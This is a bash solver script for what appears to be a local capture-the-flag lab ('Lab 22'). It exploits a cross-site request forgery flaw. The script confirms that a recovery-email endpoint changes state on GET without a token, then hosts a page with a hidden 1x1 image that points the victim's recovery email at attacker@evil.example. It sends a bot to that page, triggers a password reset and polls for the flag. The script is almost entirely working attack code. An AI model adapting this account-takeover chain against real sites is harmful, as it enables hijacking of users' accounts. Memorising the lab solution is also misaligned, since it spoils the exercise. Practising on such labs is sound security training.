#!/usr/bin/env bash
# Lab 22 — the write happens on GET, so the exploit is a link the victim opens.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9220}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab22

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

# 1. Prove the endpoint writes on GET and wants no token: without the cookie it
#    answers 401, not "missing token". The cookie is the only credential.
send "$SESSION" req_0 --create --set path=/account/recovery-email \
    --set query.email=probe@evil.example | body >&2; echo >&2

# 2. Host a page on the other origin whose only job is to make that request.
#    The victim's cookie rides on it because a browser attaches cookies by
#    destination, not by who asked.
PAGE='<html><body>loading…<img src="http://127.0.0.1:9220/account/recovery-email?email=attacker@evil.example" width="1" height="1"></body></html>'

send "$SESSION" req_0 --create --set method=POST --set path=/page \
    --set header.Content-Type=application/json \
    --set "json.name=trap$$" --set "json.html=$PAGE" >/dev/null

send "$SESSION" req_0 --create --set method=POST --set path=/report \
    --set header.Content-Type=application/json \
    --set "json.url=http://127.0.0.1:9221/p/trap$$" >/dev/null

for _ in $(seq 1 30); do
    OUT="$(send "$SESSION" req_0 --create --set path=/account/reset | flag)"
    [ "$OUT" != "no flag found" ] && { printf '%s\n' "$OUT"; exit 0; }
    sleep 1
done
echo "no flag found"
